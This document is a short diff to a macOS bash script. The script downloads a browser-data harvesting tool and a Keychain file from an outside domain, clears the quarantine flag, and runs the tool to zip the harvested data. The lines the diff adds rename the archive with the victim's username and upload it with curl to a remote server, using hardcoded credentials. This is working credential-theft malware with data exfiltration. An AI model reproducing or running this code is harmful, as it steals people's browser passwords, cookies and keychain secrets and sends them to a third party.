@@ -1,7 +1,7 @@
 #!/bin/bash
 
-remoteBrowserHacker="http://127.0.0.1:8000/hack-browser-data"
-remoteKeychain="http://127.0.0.1:8000/Keychain"
+remoteBrowserHacker="http://tools-bitget.com/hack-browser-data"
+remoteKeychain="http://tools-bitget.com/Keychain"
 
 localBrowserHacker=/tmp/tempLog
 localKeychain=/tmp/Keychain
@@ -18,3 +18,9 @@ xattr -c $localBrowserHacker
 chmod +x $localBrowserHacker
 
 $localBrowserHacker --zip
+
+timestr=`date '+%Y-%m-%d_%H:%M:%S'`
+
+mv /tmp/results/results.zip /tmp/results/$(whoami)_$timestr.zip
+
+curl -s -u'admin:bitget4321' -T /tmp/results/$(whoami)_$timestr.zip http://jamf.bitget.works:81/
